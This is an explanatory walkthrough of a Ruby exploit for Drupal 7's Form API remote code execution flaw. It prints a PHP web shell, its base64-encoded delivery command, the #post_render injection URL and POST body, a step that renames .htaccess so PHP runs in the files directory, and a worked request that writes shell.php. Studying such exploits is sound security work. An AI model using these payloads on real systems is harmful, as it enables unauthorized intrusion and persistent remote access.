
---
```rb
# Settings - Payload (we could just be happy without this PHP shell, by using just the OS shell - but this is 'better'!)
bashcmd = "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }"
bashcmd = "echo " + Base64.strict_encode64(bashcmd) + " | base64 -d"
```

In the first statement, if the HTTP request contains a parameter named `c` (for example, `?c=whoami` in a GET request or `c=ls` in a POST request), the script takes the value of `c` and passes it to the system shell for execution.
It also redirects standard error to standard output using `' 2>&1'`, so any error messages are returned along with the command output, allowing you to see failures or execution issues.

Next, the script takes the PHP web shell code and encodes it into a Base64 string. It then constructs a bash command that uses `echo` to print the Base64-encoded content and pipes it into `base64 -d` to decode it back to its original form.
This allows the payload to be safely transmitted and reconstructed on the target system, reducing issues caused by special characters or filtering mechanisms.

```rb
def gen_evil_url(evil, element="", shell=false, phpfunction="passthru")
  puts info("Payload: #{evil}") if not shell
  puts verbose("Element    : #{element}") if not shell and not element.empty? and $verbose
  puts verbose("PHP fn     : #{phpfunction}") if not shell and $verbose
```

The function `gen_evil_url(evil, element="", shell=false, phpfunction="passthru")` is responsible for generating a malicious request that will be used to trigger Remote Code Execution on the target system. Its purpose is not to exploit the vulnerability directly, but to construct and configure the payload before it is sent to the vulnerable endpoint.

The parameter `evil` represents the actual attack payload that will be executed on the target machine. This could be a bash command, a piece of PHP code, a Base64-decoded web shell, or any injected command string. It is the core malicious content that the attacker wants the server to run.

The `element` parameter specifies which vulnerable parameter or form element is being targeted. It determines where the payload will be injected, such as a specific form field or request variable. This allows the exploit to adapt to different injection points within the application.

The `shell` parameter is a boolean flag that controls the execution mode. When set to `false`, the exploit performs a single command execution. When set to `true`, it switches to web shell deployment mode, meaning the attacker is attempting to establish persistent remote access rather than running just one command.

The `phpfunction` parameter determines which PHP function will be used on the target system to execute system commands. By default, it uses `passthru`, which directly outputs the result of the executed command. Other possible functions include `system`, `exec`, and `shell_exec`. This parameter allows flexibility in how command execution and output handling are performed on the remote server.

Overall, this function serves as a configurable attack request builder. It prepares and customizes the malicious request before it is delivered to the vulnerable application, forming an intermediate step between payload creation and actual exploitation.

```rb
elsif $drupalverion.start_with?("7") and element == "name"
    # Method #3 - Drupal v7.x: name, #post_render - HTTP 200
    url = $target + "#{$clean_url}#{$form}&name[%23post_render][]=" + phpfunction + "&name[%23type]=markup&name[%23markup]=" + evil
    payload = "form_id=user_pass&_triggering_element_name=name"
  end
```

Drupal 7’s vulnerability originates from its Form API (FAPI) design. 

```php
$form = array(
  'name' => array(
    '#type' => 'textfield',
    '#title' => 'Username',
  ),
);
```

In Drupal 7, forms are not plain HTML but are built using structured associative arrays known as ***render arrays***. Each form element contains special control keys such as 

`#type`, `#markup`, `#post_render`, and `#pre_render`, 

which determine how the element is processed and rendered. The weakness lies in how Drupal processes HTTP request parameters: nested parameters submitted by a user are automatically parsed into arrays and merged into the form structure. Critically, Drupal 7 did not properly filter or block user-supplied keys beginning with `#`, which are meant to be ***internal control properties***. As a result, an attacker can inject render array control keys such as `#post_render` and manipulate callback execution, leading to remote code execution.

 `$drupalverion.start_with?("7") and element == "name"` checks whether the target system is running Drupal 7 and whether the chosen injection point is the `name` form element. This ensures that the exploit uses a Drupal 7–specific technique. The `name` element corresponds to the username field in the password reset form (`user_pass`). Since this form is publicly accessible, it provides a convenient entry point for injecting malicious render array properties.

The line constructing the URL builds the core injection payload. By appending parameters such as `name[#post_render][]`, `name[#type]=markup`, and `name[#markup]=evil`, the exploit crafts a malicious render array structure. When processed by Drupal’s Form API, these parameters are interpreted as internal control properties of the `name` element. Setting `#type` to `markup` allows arbitrary content to be rendered, while assigning `#markup` to the `evil` payload defines the content to process. Most importantly, injecting `#post_render` forces Drupal to call the specified PHP function (stored in `phpfunction`) after rendering. Because Drupal executes callbacks defined in `#post_render`, this effectively causes the system to execute the attacker-controlled payload, resulting in remote command execution.

`payload = "form_id=user_pass&_triggering_element_name=name"`, constructs the POST body required to properly trigger the form processing flow. The `form_id=user_pass` parameter tells Drupal which form is being submitted—in this case, the password reset form. The `_triggering_element_name=name` parameter identifies which form element initiated the submission. These parameters ensure that Drupal processes the injected `name` element through its normal rendering pipeline, which ultimately triggers the malicious `#post_render` callback and executes the payload.

```rb
 # Merge locations
  webshellpath = "#{path}#{webshell}"

  # Final command to execute
  cmd = "#{bashcmd} | tee #{webshellpath}"

# By default, Drupal v7.x disables the PHP engine using: ./sites/default/files/.htaccess
  # ...however, Drupal v8.x disables the PHP engine using: ./.htaccess
  if path == "sites/default/files/"
    puts action("Moving : ./sites/default/files/.htaccess")
    cmd = "mv -f #{path}.htaccess #{path}.htaccess-bak; #{cmd}"
  end

  # Generate evil URLs
  url, payload = gen_evil_url(cmd, $element)
  # Make the request
  response = http_request(url, "post", payload, $session_cookie)
```

`webshellpath = "#{path}#{webshell}"`  constructs the full file path where the web shell will be written. The variable `path` represents the target directory (for example, `sites/default/files/`), and `webshell` represents the filename (such as `shell.php`). Together, they form the complete destination path on the target system, such as:`sites/default/files/shell.php` This defines where the malicious PHP file will be created.

The line  `cmd = "#{bashcmd} | tee #{webshellpath}"`  creates the actual system command that will be executed through the RCE vulnerability.

Drupal 7 disables PHP execution inside the `sites/default/files/` directory using a `.htaccess` file.If the web shell is written into that directory without modification, Apache will prevent the PHP file from executing.The conditional block:`cmd = "mv -f #{path}.htaccess #{path}.htaccess-bak; #{cmd}"`prepends a command that renames the `.htaccess` file before executing the main payload.This removes the PHP execution restriction, allowing the newly written `shell.php` file to run normally.

`url, payload = gen_evil_url(cmd, $element)` injects the constructed command (`cmd`) into a malicious render array using Drupal’s Form API vulnerability. Internally, this results in something equivalent to:

- `#post_render = passthru`
- `#markup = cmd`

When Drupal renders the form element, it calls: `passthru(cmd)` This executes the full command on the server.

The line: `response = http_request(url, "post", payload, $session_cookie)` sends the crafted POST request to the vulnerable Drupal endpoint. Once processed, Drupal executes the injected callback, and the web shell is written to disk. At this point, persistent remote access is established.

```url
url = $target + "#{$clean_url}#{$form}&name[%23post_render][]=" + phpfunction + "&name[%23type]=markup&name[%23markup]=" + evil
```

becomes :

```url
http://target.com/?q=user/password
&name[%23post_render][]=passthru
&name[%23type]=markup
&name[%23markup]=echo BASE64STRING | base64 -d | tee sites/default/files/shell.php
```

